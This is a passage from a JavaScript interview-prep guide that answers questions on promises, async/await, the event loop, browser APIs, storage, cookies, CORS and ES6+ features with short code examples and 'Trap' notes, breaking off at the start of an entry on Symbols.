**Trap:** "First to settle" includes rejections — if the fastest Promise happens to reject, `race()` rejects too, even if a slower one would have succeeded.

### Q108. What is `Promise.any()`?

**A:** Resolves with the **first fulfilled** Promise, ignoring rejections — only rejects (with an `AggregateError`) if *every* Promise rejects.

```javascript
Promise.any([promise1, promise2, promise3])
  .then((first) => console.log("First success:", first))
  .catch((err) => console.error("All failed:", err)); // AggregateError
```

**Trap:** `any()` vs `race()` is a common mix-up — `race()` cares about "first to settle" (success or failure), `any()` specifically wants "first success" and tolerates failures along the way.

### Q109. What is the difference between `Promise.all()` and `Promise.allSettled()`?

**A:**

| | Waits for | Rejects when | Result shape |
| --- | --- | --- | --- |
| `Promise.all()` | All to resolve | Any one rejects (fail-fast) | Array of values |
| `Promise.allSettled()` | All to settle | Never | Array of `{status, value/reason}` |

```javascript
// Use .all() when you need every result to proceed (e.g., loading required data)
// Use .allSettled() when partial success is acceptable (e.g., batch operations)
```

**Trap:** Reach for `allSettled()` whenever individual failures shouldn't block the others — e.g. uploading 10 files where 2 failing shouldn't prevent reporting success on the other 8.

### Q110. What is async/await?

**A:** Syntax sugar over Promises that lets async code read like synchronous code — `await` pauses execution within the async function (not the whole thread) until the Promise settles.

```javascript
async function fetchUser() {
  try {
    const res = await fetch("/api/user");
    const user = await res.json();
    return user;
  } catch (err) {
    console.error(err);
  }
}
// An async function ALWAYS returns a Promise, even if you `return` a plain value
```

**Trap:** `await` only pauses the *current async function*, not the whole program — other code (and other async functions) continues running normally in the meantime.

### Q111. How do you handle errors in async/await?

**A:** `try/catch` wraps the awaited code — any rejection anywhere in the `try` block (including from a chain of awaited calls) is caught in one place.

```javascript
async function getData() {
  try {
    const res = await fetch("/api/data");
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  } catch (err) {
    console.error("Failed:", err.message);
    return null; // fallback value
  } finally {
    console.log("Cleanup runs regardless of success/failure");
  }
}
```

**Trap:** `fetch()` does NOT reject on HTTP error statuses (404, 500) — only on network failures. You must manually check `res.ok` and throw yourself, or errors silently pass through as "successful" responses.

### Q112. What is the event loop?

**A:** The mechanism that lets JS's single thread handle async operations — it continuously checks: is the call stack empty? If so, pull the next task from the queue (microtasks first, fully drained, then one macrotask) and push it onto the stack.

```javascript
console.log("1");
setTimeout(() => console.log("2"), 0);
Promise.resolve().then(() => console.log("3"));
console.log("4");
// Output: 1, 4, 3, 2
// Sync code first, then ALL microtasks (Promise), then macrotasks (setTimeout)
```

**Trap:** `setTimeout(fn, 0)` does NOT run immediately — it still goes through the macrotask queue and waits for the call stack to empty AND all microtasks to drain first.

### Q113. What is the call stack?

**A:** A LIFO (last-in-first-out) structure tracking which function is currently executing — each function call pushes a new frame; returning pops it off.

```javascript
function a() { b(); }
function b() { c(); }
function c() { console.log(new Error().stack); }
a();
// Stack (top to bottom): c, b, a, (global) - shows the call chain
```

**Trap:** An empty call stack is the *precondition* the event loop checks before pulling anything from the task queues — if the stack is never empty (an infinite loop), queued callbacks never get a chance to run, no matter how they were scheduled.

### Q114. What is the callback queue?

**A:** Also called the **macrotask queue** — where callbacks from `setTimeout`, `setInterval`, DOM events, and I/O wait their turn. Only pulled from once the call stack is empty AND the microtask queue is fully drained.

```javascript
setTimeout(() => console.log("macrotask"), 0);
Promise.resolve().then(() => console.log("microtask"));
// "microtask" always logs first - macrotask queue waits for microtasks to finish
```

**Trap:** "Callback queue" and "macrotask queue" are the same thing described with two different names — don't be thrown if an interviewer uses one term and you've studied the other.

### Q115. What is the microtask queue?

**A:** A higher-priority queue for Promise callbacks (`.then`, `.catch`, `.finally`) and `queueMicrotask()` — fully drained after every single macrotask, before the event loop moves to the next one.

```javascript
setTimeout(() => console.log("timeout"), 0);
Promise.resolve()
  .then(() => console.log("micro 1"))
  .then(() => console.log("micro 2")); // even chained microtasks run before the timeout
// Output: micro 1, micro 2, timeout
```

**Trap:** If microtasks keep queuing more microtasks (e.g., a `.then()` that schedules another `.then()`), the macrotask queue can be starved indefinitely — a real performance footgun.

### Q116. What is the difference between microtask and macrotask?

**A:**

```javascript
// Macrotasks: setTimeout, setInterval, setImmediate (Node), I/O, UI rendering
// Microtasks: Promise callbacks, queueMicrotask(), MutationObserver

console.log("1");
setTimeout(() => console.log("2 - macrotask"), 0);
Promise.resolve().then(() => console.log("3 - microtask"));
queueMicrotask(() => console.log("4 - microtask"));
console.log("5");
// Output: 1, 5, 3, 4, 2
```

**Trap:** The event loop drains the **entire** microtask queue between each single macrotask — not one microtask per macrotask, all of them.

### Q117. What is the output order of `setTimeout`, Promise, and synchronous code?

**A:** Synchronous code always runs first (top to bottom), then the entire microtask queue drains, then one macrotask runs — repeating.

```javascript
console.log("Start"); // 1. sync
setTimeout(() => console.log("Timeout"), 0); // 4. macrotask
Promise.resolve().then(() => console.log("Promise 1")); // 3. microtask
Promise.resolve().then(() => console.log("Promise 2")); // 3. microtask
console.log("End"); // 2. sync
// Output: Start, End, Promise 1, Promise 2, Timeout
```

**Trap:** This exact scenario is the single most commonly asked event-loop question — memorize the ordering rule (sync → all microtasks → one macrotask) rather than the specific example, so you can handle any variation.

### Q118. What is the difference between `setTimeout` and `setInterval`? *(new)*

**A:** `setTimeout` runs a callback once after a delay; `setInterval` runs it repeatedly every N milliseconds until explicitly stopped.

```javascript
const timeoutId = setTimeout(() => console.log("once, after 1s"), 1000);
clearTimeout(timeoutId); // cancel before it fires

const intervalId = setInterval(() => console.log("every 1s"), 1000);
clearInterval(intervalId); // must explicitly stop, or it runs forever
```

**Trap:** Neither guarantees exact timing — both only guarantee "no earlier than" the specified delay; if the call stack is busy, the actual firing time is pushed later. `setInterval` can also "stack up" callbacks if the interval is shorter than the callback's own execution time.

### Q119. What is the difference between debounce and throttle?

**A:** Debounce delays execution until activity **stops** for a set period (resets the timer on every call); throttle guarantees execution happens **at most once** per fixed interval, regardless of how often it's triggered.

```javascript
function debounce(fn, delay) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), delay);
  };
}

function throttle(fn, limit) {
  let inThrottle = false;
  return (...args) => {
    if (!inThrottle) {
      fn(...args);
      inThrottle = true;
      setTimeout(() => (inThrottle = false), limit);
    }
  };
}
```

**Trap:** Search-as-you-type wants **debounce** (wait until the user stops typing); scroll/resize handlers want **throttle** (need periodic updates while the event keeps firing continuously) — mixing these use cases up is the most common wrong answer.

### Q120. How do you cancel an API request in JavaScript?

**A:** `AbortController` is the standard modern API — pass its `signal` to `fetch()`, then call `.abort()` to cancel.

```javascript
const controller = new AbortController();

fetch("/api/data", { signal: controller.signal })
  .then((res) => res.json())
  .catch((err) => {
    if (err.name === "AbortError") console.log("Request was cancelled");
  });

controller.abort(); // cancels the in-flight request

// Common pattern: auto-cancel after a timeout
const timeoutController = new AbortController();
setTimeout(() => timeoutController.abort(), 5000);
```

**Trap:** Aborting a `fetch()` doesn't throw a normal error — it rejects with a `DOMException` named `"AbortError"`, which you should check for and usually handle silently rather than treating as a real failure.

---

<a id="phase-6"></a>

## Phase 6 – Browser APIs, DOM, BOM & Storage

**Goal:** Prepare for browser-based frontend engineering questions.

### Q121. What is the DOM? *(new)*

**A:** The Document Object Model — a live, tree-structured, in-memory representation of an HTML page that JS can read and manipulate. Each HTML tag becomes a node object with properties and methods.

```javascript
document.title; // reads the page title
const el = document.getElementById("app");
el.textContent = "Hello"; // mutating the DOM updates what's rendered
document.querySelector(".card"); // CSS-selector-based lookup
```

**Trap:** The DOM is not part of the JS language itself — it's a separate Web API the browser exposes; the same JS engine running in Node has no DOM at all.

### Q122. What is the difference between DOM and BOM? *(new)*

**A:** The **DOM** represents the page content (`document` and its tree); the **BOM** (Browser Object Model) represents the browser window itself — history, location, navigator, screen.

```javascript
// DOM - the page content
document.querySelector("h1").textContent;

// BOM - the browser environment
window.location.href; // current URL
window.history.back(); // navigation
window.navigator.userAgent; // browser info
window.screen.width; // display size
```

**Trap:** `document` is technically a *property of* `window` (part of the BOM), which is why `document.getElementById()` and `window.document.getElementById()` are identical — the DOM lives inside the BOM's `window` object.

### Q123. What is event bubbling?

**A:** Events propagate from the target element up through its ancestors (child → parent → ... → document).

```javascript
document.getElementById("parent").addEventListener("click", () => {
  console.log("Parent clicked");
});
document.getElementById("child").addEventListener("click", () => {
  console.log("Child clicked");
});
// Clicking child logs: "Child clicked" then "Parent clicked"
```

**Trap:** Not all events bubble — `focus`, `blur`, and a few others don't, which is exactly why `focusin`/`focusout` (bubbling versions) exist as alternatives.

### Q124. What is event capturing?

**A:** The opposite direction to bubbling — the event travels from `document` down to the target *before* bubbling back up. Enabled by passing `true` (or `{capture: true}`) as `addEventListener`'s third argument.

```javascript
parent.addEventListener("click", () => console.log("Parent - capture"), { capture: true });
child.addEventListener("click", () => console.log("Child - bubble"));
// Clicking child logs: "Parent - capture" then "Child - bubble"
```

**Trap:** The three phases in order are: capturing (document → target) → target → bubbling (target → document) — most listeners default to the bubble phase, which is why capturing is easy to forget exists.

### Q125. What is event delegation?

**A:** Attaching a single listener to a parent element instead of one per child, relying on bubbling to catch events from descendants — especially useful for dynamically added elements.

```javascript
document.getElementById("list").addEventListener("click", (e) => {
  if (e.target.matches("li")) {
    console.log("Clicked item:", e.target.textContent);
  }
});
// Works even for <li> elements added to the list AFTER this listener was set up
```

**Trap:** The main benefit isn't just fewer listeners — it's that delegation automatically covers elements added *later*, which direct per-element listeners never would without re-binding.

### Q126. What is `event.preventDefault()`? *(new)*

**A:** Stops the browser's default action for an event (following a link, submitting a form, showing a context menu) without stopping the event from propagating.

```javascript
document.querySelector("form").addEventListener("submit", (e) => {
  e.preventDefault(); // stop the page from reloading
  // handle submission with JS (e.g., fetch) instead
});

document.querySelector("a").addEventListener("click", (e) => {
  e.preventDefault(); // stop navigation
});
```

**Trap:** `preventDefault()` and `stopPropagation()` (Q127) do completely different things and are often confused — `preventDefault` stops the browser's built-in behavior; `stopPropagation` stops the event from bubbling/capturing further.

### Q127. What is `event.stopPropagation()`?

**A:** Stops an event from continuing to bubble (or capture) to ancestor elements — other listeners on the *same* element still run.

```javascript
child.addEventListener("click", (event) => {
  event.stopPropagation(); // prevents the event from reaching ancestors
  console.log("Only this handler runs, parent's listener never fires");
});
```

**Trap:** `stopImmediatePropagation()` is the stronger sibling — it also blocks *other listeners on the same element*, not just ancestors, which plain `stopPropagation()` doesn't do.

### Q128. What is the difference between `target` and `currentTarget`? *(new)*

**A:** `event.target` is the element that actually triggered the event (where the click/etc. happened); `event.currentTarget` is the element the listener is attached to — they only match when there's no bubbling involved.

```javascript
document.getElementById("parent").addEventListener("click", (e) => {
  console.log(e.target); // the actual element clicked (could be a nested child)
  console.log(e.currentTarget); // always #parent - where THIS listener lives
});
```

**Trap:** Inside event delegation (Q125), `target` is what you almost always want to inspect (`e.target.matches(...)`) — using `currentTarget` there just gives you back the parent you already know about.

### Q129. What is the difference between `window`, `document`, and `screen`? *(new)*

**A:** `window` is the global browser object (everything lives on it); `document` is the DOM tree for the current page (a property of `window`); `screen` holds physical display info (monitor resolution), independent of the browser window's size.

```javascript
window.innerWidth; // browser viewport width
document.body; // the page's <body> element
screen.width; // the user's MONITOR width, not the browser window
screen.availHeight; // usable screen height minus OS taskbars, etc.
```

**Trap:** `screen.width` is often mistaken for the viewport size — for the actual visible browser area, use `window.innerWidth`/`innerHeight` instead.

### Q130. What is localStorage?

**A:** Key-value storage (strings only) that persists across browser sessions/tabs, scoped per origin, with no expiration until explicitly cleared.

```javascript
localStorage.setItem("theme", "dark");
localStorage.getItem("theme"); // "dark"
localStorage.removeItem("theme");
localStorage.clear(); // wipes everything for this origin

localStorage.setItem("user", JSON.stringify({ name: "John" })); // objects need serializing
const user = JSON.parse(localStorage.getItem("user"));
```

**Trap:** Storage limits (~5-10MB depending on browser) and synchronous API — reading/writing large amounts of data can block the main thread briefly.

### Q131. What is sessionStorage?

**A:** Same API as `localStorage`, but scoped to a single tab/window session — cleared when that tab closes, and not shared across tabs even to the same site.

```javascript
sessionStorage.setItem("formDraft", JSON.stringify({ step: 2 }));
sessionStorage.getItem("formDraft");
// Opening the same site in a NEW tab gets a completely separate sessionStorage
```

**Trap:** Duplicating a tab (browser "duplicate tab" feature) copies `sessionStorage` to the new tab; opening a fresh tab and navigating there does not.

### Q132. What is the difference between cookie, localStorage, and sessionStorage? *(new)*

**A:**

| | Sent to server? | Capacity | Lifetime | Access |
| --- | --- | --- | --- | --- |
| Cookie | Yes, on every request | ~4KB | Set expiry, or session | JS + server |
| localStorage | No | ~5-10MB | Until cleared | JS only |
| sessionStorage | No | ~5-10MB | Until tab closes | JS only |

```javascript
document.cookie = "token=abc123; max-age=3600"; // sent automatically with requests
localStorage.setItem("theme", "dark"); // never sent to server
```

**Trap:** Cookies being sent with *every* HTTP request is both their defining feature (needed for server-side auth) and their biggest cost (added payload on every request) — that trade-off is exactly why localStorage exists for pure client-side data.

### Q133. Why do we need cookies? *(new)*

**A:** They're the only client storage mechanism automatically sent to the server with every request — essential for stateless HTTP to maintain sessions (login state, auth tokens) across page loads.

```javascript
// Server sets a cookie via response header: Set-Cookie: sessionId=abc123; HttpOnly
// Browser automatically includes it on every subsequent request to that domain
document.cookie; // "sessionId=abc123" - readable in JS unless HttpOnly is set
```

**Trap:** `HttpOnly` cookies (set only by the server) are invisible to `document.cookie` entirely — a key security feature that prevents JS (and therefore XSS attacks, see Q179) from stealing session tokens.

### Q134. How do you create, read, update, and delete cookies? *(new)*

**A:** All through the single `document.cookie` string property — reading returns everything, writing appends/updates one cookie at a time.

```javascript
// Create / Update (same operation - matching name overwrites)
document.cookie = "username=John; max-age=3600; path=/";

// Read (returns ALL cookies as one semicolon-separated string)
console.log(document.cookie); // "username=John; theme=dark"

// Delete (set max-age to 0 or a past expiry date)
document.cookie = "username=; max-age=0; path=/";
```

**Trap:** There's no `document.cookie.get(name)` — you have to manually parse the semicolon-delimited string yourself (or use a small helper function) to read an individual cookie's value.

### Q135. What are cookie options like expiry and path? *(new)*

**A:**

```javascript
document.cookie =
  "token=abc123; " +
  "max-age=3600; " + // expires in 3600 seconds
  "expires=Fri, 31 Dec 2026 23:59:59 GMT; " + // or an absolute date
  "path=/; " + // available on all paths under this domain
  "domain=example.com; " + // which domain(s) it's sent to
  "secure; " + // only sent over HTTPS
  "samesite=Strict"; // blocks cross-site sending (CSRF protection, see Q181)
```

**Trap:** `HttpOnly` can only be set by the **server** via the `Set-Cookie` response header — it cannot be set from client-side JavaScript at all, which is the whole point (protects it from XSS).

### Q136. What is a storage event? *(new)*

**A:** Fires on `window` in **other tabs/windows** of the same origin when `localStorage` changes — lets tabs stay in sync (e.g., logging out in one tab logs out all tabs).

```javascript
window.addEventListener("storage", (e) => {
  console.log(e.key); // which key changed
  console.log(e.oldValue, e.newValue);
  console.log(e.url); // which page made the change
});

// In another tab: localStorage.setItem('loggedOut', 'true');
// This tab's storage listener fires automatically
```

**Trap:** The event does **NOT** fire in the same tab/window that made the change — only in other tabs listening to the same origin's storage, a very common point of confusion.

### Q137. What is IndexedDB?

**A:** A low-level, transactional, NoSQL-style client-side database for large amounts of structured data — asynchronous API, supports indexes, far more capacity than localStorage.

```javascript
const request = indexedDB.open("MyDB", 1);
request.onupgradeneeded = (e) => {
  const db = e.target.result;
  db.createObjectStore("users", { keyPath: "id" });
};
request.onsuccess = (e) => {
  const db = e.target.result;
  const tx = db.transaction("users", "readwrite");
  tx.objectStore("users").add({ id: 1, name: "John" });
};
```

**Trap:** Its raw callback-based API is notoriously verbose — in real projects, most teams reach for a wrapper library (like `idb`) rather than using it directly.

### Q138. What is Web Worker?

**A:** Runs JS on a **separate background thread**, off the main thread — for CPU-intensive work that would otherwise freeze the UI. Communicates with the main thread via `postMessage`.

```javascript
// main.js
const worker = new Worker("worker.js");
worker.postMessage({ command: "start", data: [1, 2, 3] });
worker.onmessage = (e) => console.log("From worker:", e.data);

// worker.js
self.onmessage = (e) => {
  const result = e.data.data.map((x) => x * 2);
  self.postMessage(result);
};
```

**Trap:** Workers run in a completely separate global scope — no access to `window`, `document`, or the DOM at all (see Q139).

### Q139. What are the restrictions of Web Workers?

**A:**

```javascript
// Inside a worker file, ALL of these are unavailable:
// - document, window (no DOM access at all)
// - Direct access to variables in the main thread's scope
// - Synchronous XHR is deprecated; most DOM-dependent APIs are off-limits

// Available instead:
// - fetch(), XMLHttpRequest (async)
// - setTimeout/setInterval
// - IndexedDB
// - postMessage() for communication with the main thread
```

**Trap:** Because there's no DOM access, workers can only communicate via `postMessage` (structured-clone serialized, not shared memory by default) — you can't have a worker directly mutate the page.

### Q140. What is `postMessage`? *(new)*

**A:** The standard API for sending messages across execution contexts that don't share memory — between a page and its Web Worker, or between a page and a cross-origin iframe/popup window.

```javascript
// Worker communication
worker.postMessage({ type: "START" });

// Cross-origin window communication (e.g., with an iframe)
iframe.contentWindow.postMessage("hello", "https://trusted-origin.com");

window.addEventListener("message", (e) => {
  if (e.origin !== "https://trusted-origin.com") return; // ALWAYS verify origin
  console.log(e.data);
});
```

**Trap:** Always check `event.origin` inside the listener — skipping this check means any page on the internet could send your window a message and have it trusted, a real security hole.

### Q141. What is CORS?

**A:** Cross-Origin Resource Sharing — a browser security mechanism that blocks JS from one origin making requests to a different origin, unless the server explicitly allows it via response headers.

```javascript
fetch("https://api.other-site.com/data")
  .then((res) => res.json())
  .catch((err) => console.error(err));
// Fails unless api.other-site.com responds with:
// Access-Control-Allow-Origin: <your-origin-or-*>
```

**Trap:** CORS is enforced by the **browser**, not the server — the request still reaches the server and can still execute (e.g., a POST still happens); the browser just blocks the *response* from reaching your JS.

### Q142. What is same-origin policy? *(new)*

**A:** The browser security model CORS is an *exception to* — by default, a page can only freely interact with resources (via JS: reading responses, accessing cookies/localStorage) from the exact same origin (protocol + domain + port).

```javascript
// https://example.com:443 and https://example.com:8080 are DIFFERENT origins (port differs)
// https://example.com and http://example.com are DIFFERENT origins (protocol differs)
// https://app.example.com and https://example.com are DIFFERENT origins (subdomain differs)

fetch("https://example.com/api"); // from https://example.com - allowed, same origin
fetch("https://other.com/api"); // blocked by same-origin policy, unless CORS allows it
```

**Trap:** Origin comparison is exact on all three parts (protocol, domain, port) — even a different port on the same domain counts as cross-origin, which trips up local development (`localhost:3000` vs `localhost:8080`).

### Q143. What is a service worker?

**A:** A script that runs in the background, separate from the page, acting as a programmable network proxy — enables offline support, caching strategies, and push notifications.

```javascript
navigator.serviceWorker.register("/sw.js");

// sw.js
self.addEventListener("fetch", (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) => cached || fetch(event.request)),
  );
});
```

**Trap:** Requires HTTPS in production (localhost is exempted for development) — a service worker can intercept ALL network traffic for the page, so browsers restrict it to secure contexts only.

### Q144. What is browser caching? *(new)*

**A:** Storing previously fetched resources (scripts, images, API responses) locally so subsequent requests can be served instantly without hitting the network — controlled via HTTP headers.

```
Cache-Control: max-age=31536000, immutable   // cache for 1 year, never revalidate
Cache-Control: no-cache                       // always revalidate with server first
ETag: "abc123"                                // server-provided fingerprint for revalidation
```

```javascript
// Service workers (Q143) let you implement custom caching strategies in JS,
// on top of the browser's built-in HTTP cache
```

**Trap:** `no-cache` doesn't mean "don't cache" (that's `no-store`) — it means "cache it, but always revalidate with the server before using it," a very common misreading.

### Q145. What is critical rendering path? *(new)*

**A:** The sequence of steps the browser takes to convert HTML/CSS/JS into pixels on screen: parse HTML → build DOM → parse CSS → build CSSOM → combine into the Render Tree → Layout (compute positions/sizes) → Paint (draw pixels).

```
HTML  --parse-->  DOM  \
                        --> Render Tree --> Layout --> Paint --> Composite
CSS   --parse-->  CSSOM /
```

**Trap:** Render-blocking resources (synchronous `<script>` tags in `<head>`, external CSS) delay this whole pipeline — this is exactly why `defer`/`async` script attributes and critical-CSS inlining exist as optimization techniques.

---

<a id="phase-7"></a>

## Phase 7 – ES6+ and Modern JavaScript Features

**Goal:** Strengthen modern JavaScript concepts used in React and modern frontend projects.

### Q146. What are ES6 modules?

**A:** The standard, native way to split code into reusable files, each with its own scope — using `import`/`export`, statically analyzable (unlike CommonJS's dynamic `require`).

```javascript
// math.js
export function add(a, b) { return a + b; }
export default function multiply(a, b) { return a * b; }

// app.js
import multiply, { add } from "./math.js";
add(2, 3); // 5
```

**Trap:** ES modules are always in strict mode automatically, and imports are hoisted + resolved before any code runs — you can `import` from a file declared further down and it still works.

### Q147. What is the difference between default export and named export?

**A:** A file can have **one** default export (imported without braces, any local name) and **many** named exports (imported with braces, exact name required unless aliased).

```javascript
// utils.js
export default function formatDate() {}
export const PI = 3.14159;
export function square(x) { return x * x; }

// app.js
import formatDate, { PI, square } from "./utils.js"; // default + named together
import formatDate2, { square as sq } from "./utils.js"; // aliasing
import * as utils from "./utils.js"; // import everything as a namespace object
```

**Trap:** Default exports can be renamed freely on import (no braces needed); named exports must match the exported name exactly unless you explicitly use `as` to alias.

### Q148. What is destructuring assignment?

**A:** Unpacking values from arrays or objects into distinct variables in a single expression.

```javascript
// Object destructuring - by key name
const { name, age } = { name: "John", age: 25 };

// Array destructuring - by position
const [first, second] = [1, 2];

// Nested + renamed + defaulted
const {
  user: { email = "none@example.com" } = {},
} = { user: {} };

// Function parameter destructuring - extremely common in React props
function Greeting({ name, greeting = "Hello" }) {
  return `${greeting}, ${name}`;
}
```

**Trap:** Destructuring a `null` or `undefined` value throws immediately (`Cannot destructure property of undefined`) — the `= {}` default pattern above guards against that.

### Q149. What are default parameters?

**A:** Fallback values used when an argument is `undefined` (not passed, or explicitly passed as `undefined`) — evaluated fresh on every call, and can reference earlier parameters.

```javascript
function greet(name = "Guest", greeting = `Hello, ${name}`) {
  return greeting;
}
greet(); // "Hello, Guest"
greet("John"); // "Hello, John"
greet("John", "Hi"); // "Hi"
greet(undefined, "Hi"); // "Hi" - undefined triggers the default
greet(null); // "Hello, null" - null does NOT trigger the default!
```

**Trap:** Only `undefined` triggers a default value — passing `null` explicitly does not, a subtle distinction interviewers like to test.

### Q150. What are template literals?

**A:** Backtick-delimited strings with embedded expression support (`${}`) and native multi-line support.

```javascript
const name = "John";
const msg = `Hello, ${name}! Today is ${new Date().toDateString()}.`;
const multiLine = `Line 1
Line 2`;
```

**Trap:** Expressions inside `${}` can be arbitrarily complex (function calls, ternaries) — not just variable names, which people sometimes assume.

### Q151. What are computed property names? *(new)*

**A:** Using a bracketed expression as an object key at creation time, instead of a static identifier — the key is evaluated dynamically.

```javascript
const key = "dynamicKey";
const obj = {
  [key]: "value", // key becomes "dynamicKey"
  [`${key}_2`]: "value2", // expressions work too
  [Symbol.iterator]: function* () {}, // even Symbols as keys
};
console.log(obj); // { dynamicKey: 'value', dynamicKey_2: 'value2', ... }

// Common real use: building an object keyed by a variable
function makeLookup(id, data) {
  return { [id]: data };
}
```

**Trap:** Before ES6, achieving this required a two-step `obj[key] = value` after creating the object — computed property names let you do it inline in the literal itself.

### Q152. What are object shorthand properties? *(new)*

**A:** When a variable name matches the desired property key, you can omit the `key: value` repetition — same for defining methods without the `function` keyword.

```javascript
const name = "John";
const age = 25;

// Shorthand property
const obj = { name, age }; // same as { name: name, age: age }

// Shorthand method
const obj2 = {
  greet() {
    return "hi";
  }, // same as greet: function() { return "hi"; }
};
```

**Trap:** Shorthand method syntax loses the function's `.name` inference benefit in some edge cases with computed keys — minor, but worth knowing it's not 100% identical to the long form in every case.

### Q153. What are classes in JavaScript?

**A:** Syntax (introduced ES6) for defining reusable object blueprints — syntactic sugar over the existing prototype-based inheritance system, not a new inheritance model.

```javascript
class Person {
  constructor(name, age) {
    this.name = name;
    this.age = age;
  }
  greet() {
    return `Hi, I'm ${this.name}`;
  } // goes on Person.prototype under the hood
}
const p = new Person("John", 25);
```

**Trap:** Class bodies run in strict mode automatically, and class declarations are NOT hoisted the way function declarations are — they exist in the TDZ until evaluated (same as `let`/`const`).

### Q154. What is the difference between class and constructor function?

**A:** `class` is syntax sugar over the exact same prototype mechanism constructor functions use — but with real differences: no hoisting, enforced strict mode, `new` is mandatory, and cleaner syntax for inheritance/static/private members.

```javascript
// Constructor function
function PersonOld(name) { this.name = name; }
PersonOld.prototype.greet = function () { return this.name; };

// Class - equivalent under the hood
class Person {
  constructor(name) { this.name = name; }
  greet() { return this.name; }
}

Person(); // TypeError: cannot call a class without 'new'
PersonOld(); // silently works (badly) - `this` becomes the global object
```

**Trap:** Calling a class without `new` throws immediately; calling an old-style constructor function without `new` silently "succeeds" but corrupts the global object — classes make a whole category of bugs impossible.

### Q155. What are static methods?

**A:** Methods that belong to the class itself, not to instances — called as `ClassName.method()`, commonly used for factory functions or utility methods related to the class.

```javascript
class Person {
  constructor(name) { this.name = name; }
  static create(name) {
    return new Person(name);
  }
  static compare(a, b) {
    return a.name.localeCompare(b.name);
  }
}

const p = Person.create("John"); // called on the class, not an instance
// const p2 = p.create('Jane');    // TypeError - not available on instances
```

**Trap:** Static methods can't access instance properties via `this` (there's no instance) — inside a static method, `this` refers to the class itself.

### Q156. What are private class fields?

**A:** Fields/methods prefixed with `#`, enforced by the JS engine (not just convention) to be inaccessible from outside the class — a true encapsulation mechanism, unlike the old `_field` naming trick.

```javascript
class BankAccount {
  #balance = 0; // private field

  deposit(amount) {
    this.#balance += amount;
  }
  #logTransaction(msg) {
    // private method
    console.log(msg);
  }
  getBalance() {
    return this.#balance;
  }
}

const acc = new BankAccount();
acc.deposit(100);
acc.getBalance(); // 100
// acc.#balance;              // SyntaxError - inaccessible outside the class
```

**Trap:** Accessing `acc.#balance` from outside isn't just `undefined` — it's a hard `SyntaxError` at parse time, a much stronger guarantee than the old underscore-prefix convention ever provided.

### Q157. What is optional chaining?

**A:** `?.` short-circuits to `undefined` instead of throwing when accessing a property/method/index on `null` or `undefined`.

```javascript
const user = { profile: { name: "John" } };

user?.profile?.name; // "John"
user?.address?.city; // undefined - no error, even though address doesn't exist
user?.getEmail?.(); // undefined - safely calls a method that might not exist
user?.hobbies?.[0]; // undefined - safe array/index access too
```

**Trap:** Optional chaining short-circuits the **entire remaining chain** on the first `null`/`undefined` — `a?.b.c.d` still throws if `b` exists but `c` doesn't, unless every link uses `?.`.

### Q158. What is nullish coalescing?

**A:** `??` returns the right-hand value only when the left is `null` or `undefined` — unlike `||`, it does NOT treat `0`, `""`, `false`, or `NaN` as "missing."

```javascript
const count = 0;
count || 10; // 10 - WRONG, treats 0 as falsy
count ?? 10; // 0 - correct, 0 is a valid value, not nullish

const name = "";
name ?? "Guest"; // "" - empty string is preserved
name || "Guest"; // "Guest" - "" is falsy, so || overrides it (usually unwanted)
```

**Trap:** `??` and `&&`/`||` cannot be mixed without parentheses in the same expression — `a || b ?? c` is a `SyntaxError`, an intentional restriction to prevent ambiguous precedence bugs.

### Q159. What is the difference between `||` and `??`?

**A:** `||` falls back on ANY falsy value (`0`, `""`, `false`, `NaN`, `null`, `undefined`); `??` falls back ONLY on `null`/`undefined`, leaving other falsy values intact.

```javascript
function getQuantity(qty) {
  return qty || 1; // BUG: qty=0 becomes 1!
}
function getQuantityFixed(qty) {
  return qty ?? 1; // qty=0 stays 0, correct
}
```

**Trap:** This is the exact reason `??` was introduced — `qty || defaultValue` is a very common real-world bug whenever `0` (or `""`) is a legitimate value.

### Q160. What are generators?

**A:** Functions (`function*`) that can pause and resume execution, yielding a sequence of values one at a time via `yield`, instead of computing/returning everything at once.

```javascript
function* numberGenerator() {
  yield 1;
  yield 2;
  yield 3;
}
const gen = numberGenerator();
gen.next(); // { value: 1, done: false }
gen.next(); // { value: 2, done: false }
gen.next(); // { value: 3, done: false }
gen.next(); // { value: undefined, done: true }

for (const num of numberGenerator()) console.log(num); // 1, 2, 3
```

**Trap:** Calling a generator function doesn't run its body at all — it returns an iterator immediately; the body only executes incrementally as `.next()` is called.

### Q161. What is the `yield` keyword?

**A:** Pauses a generator function, returning a value to the caller, and resumes from that exact point on the next `.next()` call — can also receive a value passed back in via `.next(value)`.

```javascript
function* conversation() {
  const name = yield "What's your name?";
  const age = yield `Hi ${name}, how old are you?`;
  return `${name} is ${age} years old`;
}
const gen = conversation();
gen.next(); // { value: "What's your name?", done: false }
gen.next("John"); // { value: "Hi John, how old are you?", done: false } - "John" becomes `name`
gen.next("25"); // { value: "John is 25 years old", done: true }
```

**Trap:** `yield` can flow data BOTH directions — out via its own expression value, and back in via the argument to the next `.next()` call — a two-way communication channel, not just a one-way pause.

### Q162. What are iterators?

**A:** Any object implementing the iterator protocol: a `.next()` method returning `{value, done}`. Arrays, Strings, Maps, and Sets all have built-in iterators, which is what makes `for...of` work on them.

```javascript
function makeIterator(arr) {
  let index = 0;
  return {
    next() {
      return index < arr.length
        ? { value: arr[index++], done: false }
        : { value: undefined, done: true };
    },
  };
}
const it = makeIterator(["a", "b"]);
it.next(); // { value: 'a', done: false }
it.next(); // { value: 'b', done: false }
it.next(); // { value: undefined, done: true }
```

**Trap:** Plain objects (`{}`) don't have a built-in iterator, which is exactly why `for...of` throws on them while `for...in` (Q95's phase-9 cousin) works fine on any object.

### Q163. What is the iterable protocol? *(new)*

**A:** An object is "iterable" if it implements `[Symbol.iterator]()`, a method returning an iterator (Q162). This is the specific interface `for...of`, spread (`...`), and destructuring all rely on.

```javascript
const range = {
  from: 1,
  to: 3,
  [Symbol.iterator]() {
    let current = this.from;
    const last = this.to;
    return {
      next() {
        return current <= last
          ? { value: current++, done: false }
          : { value: undefined, done: true };
      },
    };
  },
};

[...range]; // [1, 2, 3] - spread works because it's iterable
for (const n of range) console.log(n); // 1, 2, 3
```

**Trap:** "Iterable" and "iterator" are related but distinct: an iterable's `[Symbol.iterator]()` *returns* an iterator — confusing the two terms is a common imprecision interviewers notice.

### Q164. What are Symbols?

**A:** A primitive type introduced in ES6 representing a guaranteed-unique value — used mainly as "hidden" or collision-free object keys.

```javascript
